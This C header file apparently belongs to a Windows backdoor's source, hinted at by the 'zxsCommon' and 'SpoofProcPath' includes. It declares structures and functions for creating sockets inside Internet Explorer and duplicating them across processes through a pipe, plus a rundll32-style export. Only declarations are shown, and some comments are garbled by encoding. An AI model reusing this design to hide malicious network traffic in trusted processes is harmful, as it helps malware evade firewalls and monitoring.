#if !defined _IE_CREATESOCKET

#define _IE_CREATESOCKET


#include <winsock2.h>
#include <windows.h>

#include ".\common.h"
#include "SpoofProcPath.h"
#include "..\zxsCommon\debugoutput.h"

#pragma pack(push, 1)

//for IESOCKET.type
#define IESOCKET_ACTION_CONNECT    0
#define IESOCKET_ACTION_LISTEN	   1

typedef struct _IESOCKET
{
	int action;//0 connect�� 1 listen

	//WSASocket ����
	int af;
	int type;
	int protocol;
	DWORD dwFlags;
	//

	char host[50];
	WORD port;

	DWORD sharePID;
	SOCKET Socket;
}IESOCKET, *PIESOCKET;

typedef struct _IESOCKETSHAREDDATA
{
	DWORD retCode;
	WSAPROTOCOL_INFO WSAPI;
}IESOCKETSHAREDDATA, *PIESOCKETSHAREDDATA;

#pragma pack(pop)

void CALLBACK zxFunction002(
				HWND hWnd, // handle to owner window
				HINSTANCE hInst, // instance handle for the DLL
				char *Param, // string the DLL will parse
				int nCmdShow // show state
);

BOOL MakeDupSocket(char *lpszPipeName);
BOOL ieCreateSocket(PIESOCKET iesock);

#endif